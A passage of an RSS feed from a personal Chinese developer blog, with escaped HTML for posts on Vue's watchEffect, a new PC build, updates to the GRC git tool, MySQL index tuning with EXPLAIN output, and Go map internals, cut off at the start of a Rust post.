监听回调函数内依赖的响应式数据的变化来执行回调函数.&lt;/p>
&lt;p>对,没错, 它能监听函数内变化的响应数据并且自动执行回调函数! 是不是很魔法!
连反射都做不到监听函数内依赖的外部变量.&lt;/p>
&lt;p>举个例子:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kr">const&lt;/span> &lt;span class="nx">count&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">watchEffect&lt;/span>&lt;span class="p">(()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">count&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="c1">// 当count数据发送变化的时候会执行watchEffect内的回调函数
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>还有一个watch函数也可以做到类似的操作, 不过需要手动在第一个参数指定监听的响应式数据.
watch的原理就比较容易懂了. 指定了依赖就可以通过挂钩子来实现监听变化执行回调了.&lt;/p>
&lt;p>问题就在watchEffect是怎么做到不指定依赖就能知道回调内依赖了哪个响应式数据?并且自动执行的?&lt;/p>
&lt;p>这个魔法的原理我想破头也没有想出来. 看了一些关于副作用的文章之后才开始理解这个魔法的本质.&lt;/p>
&lt;p>&lt;code>watch&lt;/code> 和 &lt;code>watchEffect&lt;/code> 有一个区别就在于, watchEffect在页面渲染后会首次执行一次.
这个动作就是魔法的秘密了, 执行后watchEffect就能看到那些响应式数数据收到了回调的影响.(不一定是数据的变化)&lt;/p></description></item><item><title>Log 13</title><link>https://sdttttt.github.io/blog/log-13/</link><pubDate>Mon, 21 Dec 2020 09:05:08 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-13/</guid><description>
&lt;p>粗且谈一下关于新的主机的想法.&lt;/p>
&lt;p>&lt;strong>i5 10400F&lt;/strong> 这块U不带核显, 这倒是无所谓, 是i5里目前第一块6core12thread的U. 性能接近i7 8700. CPU实际上无所谓.&lt;/p>
&lt;p>&lt;strong>24G RAM&lt;/strong> 24G也是我想过之后才选择的内存大小, 32嫌大, 16嫌小, 只能这样了.&lt;/p>
&lt;p>&lt;strong>W240&lt;/strong> 散热是一个W240的水冷, 只有一个风扇. 虽然是W240, 但感觉很可能是个丐中丐.&lt;/p>
&lt;p>&lt;strong>ASUS B460-K&lt;/strong> 丐中丐主板, 用i5 10400F这U还是没有问题的. 这主板设计也有问题. SATA接口在显卡散热口的下面就离谱.&lt;/p>
&lt;p>&lt;strong>NVME M.2 250G&lt;/strong> 固态硬盘, 就这样吧, 速度倒是无所谓, 容量小了点, 导致我后面又追加了一个1T的PMR.&lt;/p>
&lt;p>&lt;strong>ASUS TUF RX5600XT 6G EVO-GAMING&lt;/strong> 嘶&amp;hellip;这显卡就比较尴尬了. 先说参数. 频率比公版高一点. TUF是个丐版, 三风扇, 其他没有问题的. 性能基本上和2060并肩,甚至更高.能超到2060S的水平. 这玩意为什么尴尬呢, 因为这块卡稍微加一两百就能到5700, 屁股后面又是RX590. 说这玩意是智商检测卡也没什么问题. 最后这块卡打全境2 全高 2560*1080居然不能稳定60FPS??? 太蒂蒂了&lt;/p>
&lt;p>周末基本上就是打游戏了. 还有追加了个硬盘. 硬盘的SATA线穿过显卡风扇. 看起来十分诡异. 这个SATA接口就不能长外面么???&lt;/p></description></item><item><title>Log 12</title><link>https://sdttttt.github.io/blog/log-12/</link><pubDate>Fri, 18 Dec 2020 12:22:28 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-12/</guid><description>
&lt;p>这两天有个接口测试的前端项目终于开始动土了，我还是一如既往的写前端呢。谁让我TM是高贵的全栈工程师（狗头&lt;/p>
&lt;p>新的台式主机也到了， 配置撑个2年不是什么大问题。
双休日总算可以畅爽的打游戏了，
还有希望明天的硬盘和音响能快点到。打游戏没有声音可是大忌锕。&lt;/p></description></item><item><title>Log 11</title><link>https://sdttttt.github.io/blog/log-11/</link><pubDate>Tue, 01 Dec 2020 10:04:34 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-11/</guid><description>
&lt;p>昨天发布了GRC的&lt;code>0.9.2&lt;/code>版本, 这个版本更新说实话比较水. 追加的功能有参数指定配置文件.还有一些小问题的修复, 就没了emm&lt;/p>
&lt;p>下次GRC追加功能应该会在&lt;code>v1.0.0&lt;/code>, 终于要到正式版本了. 如果有人有更好的想法得和我说啊啊啊!!~~
我都想不好加什么功能比较好.&lt;/p></description></item><item><title>Log 10</title><link>https://sdttttt.github.io/blog/log-10/</link><pubDate>Wed, 25 Nov 2020 11:25:47 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-10/</guid><description>
&lt;p>昨天一大早就跑去余杭, 去新园区面试. 真的挺麻烦的. 希望这种事越少越好.&lt;/p>
&lt;p>害得我昨天都没有commit.&lt;/p></description></item><item><title>Sql Optimize</title><link>https://sdttttt.github.io/blog/sql-optimize/</link><pubDate>Thu, 19 Nov 2020 13:10:52 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/sql-optimize/</guid><description>
&lt;p>本文主要讲关于&lt;code>SELECT&lt;/code>语句的优化问题. 会涉及到一些关于表索引的知识.&lt;/p>
&lt;h3 id="性能">性能&lt;/h3>
&lt;p>很简单, 你每建立一个索引, 数据库就会根据索引类型，帮你建立一个索引数据结构（B+树非常常用）.&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>NOTE:&lt;/strong>&lt;code>B+树&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>B+树对范围查询和直接查询都很在行. 直接查询的时间复杂度均为O(log), 也就是用的二分法, 具体为什么就去看&lt;code>B+树&lt;/code>的数据结构, 在看B+树之前最好先看B树, 不然东西太多消化不了.&lt;/p>
&lt;/blockquote>
&lt;/blockquote>
&lt;p>不过每次插入数据和删除数据就需要重构索引树的结构, 滥用索引反而会降低&lt;strong>写入效率&lt;/strong>.&lt;/p>
&lt;h3 id="设计">设计&lt;/h3>
&lt;p>索引有好几种, 最常用的有:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>主键索引&lt;/strong>: 比如用户表的ID字段&lt;/li>
&lt;li>&lt;strong>唯一索引&lt;/strong>: 比如不可重复的用户名&lt;/li>
&lt;li>&lt;strong>组合索引&lt;/strong>: 需要经常被一起查询的字段, 比如用户名, 密码&lt;/li>
&lt;li>&lt;strong>普通索引&lt;/strong>: 这个怎么用就仁者见仁智者见智了.&lt;/li>
&lt;/ul>
&lt;p>索引一经创建不能修改，如果要修改索引，只能删除重建. 具体怎么创建就&lt;code>baidu&lt;/code>吧。&lt;/p>
&lt;p>如果要查看一张表的索引, 如下:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="n">mysql&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">SHOW&lt;/span> &lt;span class="k">INDEX&lt;/span> &lt;span class="k">FROM&lt;/span> &lt;span class="n">users&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">+&lt;/span>&lt;span class="c1">-------+------------+-----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="o">|&lt;/span> &lt;span class="k">Table&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">Non_unique&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">Key_name&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">Seq_in_index&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">Column_name&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">Collation&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">Cardinality&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">Sub_part&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">Packed&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">Null&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">Index_type&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">Comment&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">Index_comment&lt;/span> &lt;span class="o">|&lt;/span>
&lt;span class="o">+&lt;/span>&lt;span class="c1">-------+------------+-----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="o">|&lt;/span> &lt;span class="n">users&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">PRIMARY&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">id&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">A&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">9847&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">NULL&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">NULL&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">BTREE&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="o">|&lt;/span>
&lt;span class="o">|&lt;/span> &lt;span class="n">users&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">id_UNIQUE&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">id&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">A&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">9847&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">NULL&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">NULL&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">BTREE&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="o">|&lt;/span>
&lt;span class="o">|&lt;/span> &lt;span class="n">users&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">username&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">username&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">A&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">9847&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">NULL&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">NULL&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">BTREE&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="o">|&lt;/span>
&lt;span class="o">+&lt;/span>&lt;span class="c1">-------+------------+-----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="mi">3&lt;/span> &lt;span class="k">rows&lt;/span> &lt;span class="k">in&lt;/span> &lt;span class="k">set&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">00&lt;/span> &lt;span class="n">sec&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>不重要的就不说了。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Non_unique&lt;/strong>: 能不能重复，不能为0，可以为1.&lt;/li>
&lt;li>&lt;strong>Seq_in_index&lt;/strong>: 组合索引的一个位置。等会就知道。&lt;/li>
&lt;li>&lt;strong>Sub_part&lt;/strong>: 前置索引长度，不使用前置索引则为NULL。&lt;/li>
&lt;li>&lt;strong>Cardinality&lt;/strong>: 基数，是否做为索引的最重要的因素，基数越大说明重复性越低，越有可能查询时触发索引。&lt;/li>
&lt;li>&lt;strong>Index_type&lt;/strong>: 索引类型，常用的有&lt;code>FULLTEXT&lt;/code>(用与搜索技术，主要解决模糊查询效率低下的问题)，和&lt;code>BTREE&lt;/code>（就是树形数据结构存储），还有&lt;code>Hash&lt;/code>（由于Hash的特点，只能判断值相等，不能判断值范围）。&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>&lt;strong>QUESION:&lt;/strong> 什么是前置索引？&lt;/p>
&lt;blockquote>
&lt;p>对于一些特殊字段比如&lt;code>TEXT&lt;/code>，或者&lt;code>VARCHAR(255)&lt;/code>这种很大的字段，建立的索引树会非常肥，这样的索引非常慢，我们对与这种字段会采用它们的前几个字符做为索引。选择几个字符的诀窍就是要保证要极高的非重复性，和尽量短的字符，来节省空间。&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>NOTE:&lt;/strong> 关于基数&lt;/p>
&lt;blockquote>
&lt;p>通常我们在选择索引时会尽可能选择基数大的列做为索引。
因为MySQL在执行查询时，&lt;strong>基数对比总数是是否触发索引的一个判断条件&lt;/strong>，这个值大概在30%左右。&lt;/p>
&lt;/blockquote>
&lt;/blockquote>
&lt;h3 id="调优">调优&lt;/h3>
&lt;p>查看一次&lt;strong>SELECT&lt;/strong>在MySQL使用了哪些策略，我们可以通过在SQL语句前加上&lt;code>EXPLAIN&lt;/code>来做到。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="n">mysql&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="k">EXPLAIN&lt;/span> &lt;span class="k">SELECT&lt;/span> &lt;span class="n">id&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username&lt;/span> &lt;span class="k">FROM&lt;/span> &lt;span class="n">users&lt;/span> &lt;span class="k">WHERE&lt;/span> &lt;span class="n">username&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;sdttttt&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">+&lt;/span>&lt;span class="c1">----+-------------+-------+------------+-------+---------------+----------+---------+-------+------+----------+-------------+
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="o">|&lt;/span> &lt;span class="n">id&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">select_type&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">table&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">partitions&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">type&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">possible_keys&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">key&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">key_len&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">ref&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">rows&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">filtered&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">Extra&lt;/span> &lt;span class="o">|&lt;/span>
&lt;span class="o">+&lt;/span>&lt;span class="c1">----+-------------+-------+------------+-------+---------------+----------+---------+-------+------+----------+-------------+
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="o">|&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">SIMPLE&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">users&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">NULL&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">const&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">username&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">username&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">50&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">const&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">00&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="k">Using&lt;/span> &lt;span class="k">index&lt;/span> &lt;span class="o">|&lt;/span>
&lt;span class="o">+&lt;/span>&lt;span class="c1">----+-------------+-------+------------+-------+---------------+----------+---------+-------+------+----------+-------------+
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="k">row&lt;/span> &lt;span class="k">in&lt;/span> &lt;span class="k">set&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="n">warning&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">00&lt;/span> &lt;span class="n">sec&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>&lt;strong>possible_keys&lt;/strong>: 可能触发的索引。&lt;/li>
&lt;li>&lt;strong>key&lt;/strong>: 本次SQL执行触发的索引。&lt;/li>
&lt;li>&lt;strong>filtered&lt;/strong>: 过滤了多少数据，单位：百分比。&lt;/li>
&lt;li>&lt;strong>Extra&lt;/strong>: 执行策略。&lt;/li>
&lt;/ul>
&lt;p>下面说一下&lt;code>Extra&lt;/code>，这个比较重要：&lt;/p>
&lt;p>&lt;strong>Using index&lt;/strong>&lt;/p>
&lt;p>查询的列被索引覆盖，并且&lt;code>where&lt;/code>筛选条件是索引的是前导列，&lt;code>Extra&lt;/code>中为&lt;code>Using index&lt;/code>。&lt;/p>
&lt;p>&lt;strong>Using where Using index&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>查询的列被索引覆盖，&lt;strong>并且&lt;code>where&lt;/code>筛选条件是索引列之一, 但是不是索引的不是前导列&lt;/strong>，&lt;code>Extra&lt;/code>中为&lt;code>Using where&lt;/code>; &lt;code>Using index&lt;/code>，意味着无法直接通过索引查找来查询到符合条件的数据。&lt;/li>
&lt;li>查询的列被索引覆盖，并且&lt;code>where&lt;/code>筛选条件是索引列前导列的一个范围，同样意味着无法直接通过索引查找查询到符合条件的数据。&lt;/li>
&lt;/ol>
&lt;p>&lt;em>(查询的列被索引覆盖，这种情况是不会发生回表的，只是进行索引扫描罢了)&lt;/em>&lt;/p>
&lt;p>&lt;strong>NULL&lt;/strong>&lt;/p>
&lt;p>&lt;em>（既没有&lt;code>Using index&lt;/code>，也没有&lt;code>Using where Using index&lt;/code>，也没有&lt;code>using where&lt;/code>）&lt;/em>&lt;/p>
&lt;p>1，查询的列未被索引覆盖，并且&lt;code>where&lt;/code>筛选条件是索引的前导列，意味着用到了索引，但是部分字段未被索引覆盖，必须通过“回表”来实现，不是纯粹地用到了索引，也不是完全没用到索引，&lt;code>Extra&lt;/code>中为NULL(没有信息)。&lt;/p>
&lt;p>&lt;strong>Using where&lt;/strong>&lt;/p>
&lt;p>1，查询的列未被索引覆盖，&lt;code>where&lt;/code>筛选条件非索引的前导列，&lt;code>Extra&lt;/code>中为&lt;code>Using where&lt;/code>.&lt;/p>
&lt;p>&lt;em>（&lt;code>using where&lt;/code> 意味着通过索引或者表扫描的方式进程&lt;code>where&lt;/code>条件的过滤，
反过来说，也就是没有可用的索引查找，这里的type都是all，说明MySQL认为全表扫描是一种比较低的代价。）&lt;/em>&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>EXT:&lt;/strong> ICP(Index Condition Pushdown)&lt;/p>
&lt;p>这个是&lt;code>MySQL5.6&lt;/code>新加入的特新，MySQL的设计分为两层，服务层和存储引擎。&lt;/p>
&lt;p>在没有的ICP的时候，你对索引执行过滤：首先SE（Storage Engine）将一条条索引数据取出，并且一条条给服务层看，由服务层来对照where条件。&lt;/p>
&lt;p>在使用ICP后，你对索引执行过滤：首先SE（Storage Engine）将一条条索引数据取出，并且对照下推的索引条件，如果满足条件，就返回给服务层，服务层下推到没有被SE执行的where条件。&lt;/p>
&lt;blockquote>
&lt;p>你是不是觉得很绕？其实就是索引的where条件SE帮服务层做了，服务层不&amp;gt;用去管索引的Where条件了。&lt;/p>
&lt;p>说实话我对这个功能还是挺迷的，服务层的执行速度是不如SE么？为什么ICP能提高速度？MySQL中的秘密还挺多。&lt;/p>
&lt;/blockquote>
&lt;/blockquote>
&lt;h3 id="all-in-all">All in All&lt;/h3>
&lt;p>在设计数据表的时候需要考虑这个表的读写情况，根据字段来适当的增加索引。&lt;/p>
&lt;p>在编写SQL语句时，尽可能使用索引。能调优就尽量调优。&lt;/p></description></item><item><title>GRC 5</title><link>https://sdttttt.github.io/blog/grc-5/</link><pubDate>Tue, 17 Nov 2020 15:08:13 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/grc-5/</guid><description>
&lt;p>很有趣, 上个星期有人在GRC中和我提了一个问题, GIT很多操作是要使用环境变量来控制.&lt;/p>
&lt;p>我平时根本不使用环境变量来控制GIT, 这个特性可能会在以后支持吧.&lt;/p></description></item><item><title>Go的map的个什么结构</title><link>https://sdttttt.github.io/blog/go-map/</link><pubDate>Fri, 13 Nov 2020 15:31:53 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/go-map/</guid><description>
&lt;p>实际上&lt;code>Go&lt;/code>的&lt;code>map&lt;/code>和&lt;code>Java7&lt;/code>之前的&lt;code>HashMap&lt;/code>, 非常相似。都是&lt;code>Array&lt;/code> + &lt;code>LinkedTable&lt;/code>的结构。&lt;/p>
&lt;h3 id="结构">结构&lt;/h3>
&lt;p>&lt;code>map&lt;/code>数据结构由&lt;code>runtime/map.go/hmap&lt;/code>定义:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-go" data-lang="go">
&lt;span class="kd">type&lt;/span> &lt;span class="nx">hmap&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">count&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="c1">// 当前保存的元素个数
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="o">...&lt;/span>
&lt;span class="nx">B&lt;/span> &lt;span class="kt">uint8&lt;/span> &lt;span class="c1">// 指示bucket数组的大小
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="o">...&lt;/span>
&lt;span class="nx">buckets&lt;/span> &lt;span class="nx">unsafe&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Pointer&lt;/span> &lt;span class="c1">// bucket数组指针，数组的大小为2^B
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="o">...&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>bucket&lt;/code>数据结构由&lt;code>runtime/map.go/bmap&lt;/code>定义：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-go" data-lang="go">
&lt;span class="kd">type&lt;/span> &lt;span class="nx">bmap&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">tophash&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="kt">uint8&lt;/span> &lt;span class="c1">//存储哈希值的高8位
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">data&lt;/span> &lt;span class="kt">byte&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c1">//key value数据:key/key/key/.../value/value/value...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">overflow&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">bmap&lt;/span> &lt;span class="c1">//溢出bucket的地址
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这里使用的数组对齐方式来存放数据。&lt;code>overflow&lt;/code>指向下一个&lt;code>bucket&lt;/code>.&lt;/p>
&lt;h3 id="工作流程">工作流程&lt;/h3>
&lt;p>首先通过&lt;code>key&lt;/code>计算Hash值，通过Hash的低位，计算出该元素需要存放在&lt;code>buckets&lt;/code>中的哪一个&lt;code>bucket&lt;/code>.
如果Hash冲突，也就是当前&lt;code>bucket&lt;/code>已经有人进去了。那么就使用该&lt;code>bucket&lt;/code>的&lt;code>overflow&lt;/code>指向自己的&lt;code>bucket&lt;/code>.&lt;/p>
&lt;p>查找元素也是大同小异。&lt;/p></description></item><item><title>GRC 4</title><link>https://sdttttt.github.io/blog/grc-4/</link><pubDate>Thu, 12 Nov 2020 14:07:47 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/grc-4/</guid><description>
&lt;p>啊哈, 我的新键盘已经到了, 这周周末(11.13-11.15)我会尽快修复目前GRC中的一些问题:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/sdttttt/gcr/issues/28">#25 Did not check type.&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/sdttttt/gcr/issues/28">#28 [Feature request] Create a template gcr.toml when the install is made with cargo&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/sdttttt/gcr/issues/30">#30 env GIT_AUTHOR_NAME is not used&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>希望有更多人使用GRC.&lt;/p></description></item><item><title>Impl and Dyn on Rust</title><link>https://sdttttt.github.io/blog/rust-impl-and-dyn/</link><pubDate>Thu, 12 Nov 2020 09:46:53 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/rust-impl-and-dyn/</guid><description>
&lt;p>我们先来看这样一段代码:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="w">
